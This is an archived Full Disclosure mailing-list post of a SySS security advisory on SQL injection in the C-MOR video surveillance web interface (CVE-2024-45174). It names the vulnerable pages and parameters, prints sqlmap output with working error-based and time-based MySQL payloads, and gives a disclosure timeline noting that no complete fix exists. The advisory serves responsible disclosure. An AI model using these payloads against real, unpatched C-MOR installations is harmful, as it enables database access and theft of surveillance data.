---
title: [SYSS-2024-023]: C-MOR Video Surveillance - SQL Injection	(CWE-89)
url: https://seclists.org/fulldisclosure/2024/Sep/11
source: Full Disclosure
date: 2024-09-07
fetch_date: 2025-10-06T18:31:26.199355
---

# [SYSS-2024-023]: C-MOR Video Surveillance - SQL Injection	(CWE-89)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](10)
[By Date](date.html#11)
[![Next](/images/right-icon-16x16.png)](12)

[![Previous](/images/left-icon-16x16.png)](10)
[By Thread](index.html#11)
[![Next](/images/right-icon-16x16.png)](12)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2024-023]: C-MOR Video Surveillance - SQL Injection (CWE-89)

---

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 4 Sep 2024 08:11:58 +0200

---

```
Advisory ID:               SYSS-2024-023
Product:                   C-MOR Video Surveillance
Manufacturer:              za-internet GmbH
Affected Version(s):       5.2401, 6.00PL01
Tested Version(s):         5.2401, 6.00PL01
Vulnerability Type:        SQL Injection (CWE-89)
Risk Level:                High
Solution Status:           Open
Manufacturer Notification: 2024-04-05
Solution Date:             -
Public Disclosure:         2024-09-04
CVE Reference:             CVE-2024-45174
Authors of Advisory:       Chris Beiter, Frederik Beimgraben,
                           and Matthias Deeg

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

The software product C-MOR is an IP video surveillance system.

The manufacturer describes the product as follows:

"With C-MOR video surveillance, it is possible to check your
surveillance over network and the Internet. You can access the live
view as well as previous recordings from any PC or mobile device.
C-MOR is managed and controlled over the C-MOR web interface.
IP settings, camera recording setup, user rights and so on are set
over the web without the installation of any software on the
client."[1]

Due to improper validation of user-supplied data, different
functionalities of the C-MOR web interface are vulnerable to SQL
injection attacks.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

By analyzing the C-MOR web interface, it was found that different
provided functionalities of the C-MOR web interface are vulnerable
to SQL injection attacks.

These kinds of attacks allow an authenticated user to execute arbitrary
SQL commands in the context of the corresponding MySQL database.

In the following pages, SQL injection vulnerabilities were found:

* list-timelapse.plm (URL parameter: "cam")
* list-motion.plm (URL parameter "cam")
* show-movies.plm (URL parameter "cam")

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

Using the software tool sqlmap[4], the SQL injection vulnerabilities
via the URL parameter "cam" could be easily exploited, as the following
output exemplarily illustrates:

(...)
sqlmap resumed the following injection point(s) from stored session:
- ---
Parameter: cam (GET)
    Type: error-based
```

 Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or
GROUP BY clause (FLOOR)
 Payload: days=1100&cam=cam1 AND (SELECT 2483 FROM(SELECT
COUNT(\*),CONCAT(0x717a707071,(SELECT
(ELT(2483=2483,1))),0x717a707871,FLOOR(RAND(0)\*2))x FROM
INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a)

```
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
```

 Payload: days=1100&cam=cam1 AND (SELECT 9790 FROM
(SELECT(SLEEP(5)))Yfcf)

```
- ---
[17:16:12] [INFO] the back-end DBMS is MySQL
[17:16:12] [INFO] fetching banner
[17:16:12] [INFO] resumed: '5.1.66-0+squeeze1'
web application technology: Apache
back-end DBMS: MySQL >= 5.0
banner: '5.1.66-0+squeeze1'
(...)

By exploiting the SQL injection vulnerabilities, the MySQL database
could be accessed and dumped as database user "cam".

In version 6.00PL01, some SQL injection attack instances were fixed.
However, others could still be found, for example via the URL
parameter "c" on the page getpic.pml.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

The described security vulnerability has not been fixed entirely in
the newly released software version 6.00PL01.

There is no fix for this security issue.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2024-04-05: Vulnerability reported to manufacturer
2024-04-05: Manufacturer acknowledges receipt of security advisories
2024-04-08: Exchange regarding security updates and disclosure timeline
2024-05-08: Further exchange concerning security updates and disclosure
            timeline; public release of all security advisories
            scheduled for release of C-MOR Video Surveillance version 6
2024-05-10: Release of C-MOR software version 5.30 with security updates
            for some reported security issues
2024-07-19: E-mail to manufacturer concerning release date of C-MOR
            Video Surveillance version 6; response with planned
            release date of 2024-08-01
2024-07-30: E-mail from manufacturer with further information
            concerning security fixes
2024-07-31: Release of C-MOR software version 6.00PL1
2024-09-04: Public release of security advisory

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] Product website for C-MOR Video Surveillance
    https://www.c-mor.com/
[2] SySS Security Advisory SYSS-2024-023

https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-023.txt
[3] SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy/
[4] sqlmap GitHub repository
    https://github.com/sqlmapproject/sqlmap

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Chris Beiter, Frederik
Beimgraben, and Matthias Deeg.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
```

**Attachment:
[OpenPGP\_signature.asc](att-11/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](10)
[By Date](date.html#11)
[![Next](/images/right-icon-16x16.png)](12)

[![Previous](/images/left-icon-16x16.png)](10)
[By Thread](index.html#11)
[![Next](/images/right-icon-16x16.png)](12)

### Current thread:

* **[SYSS-2024-023]: C-MOR Video Surveillance - SQL Injection (CWE-89)** *Matthias Deeg via Fulldisclosure (Sep 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://...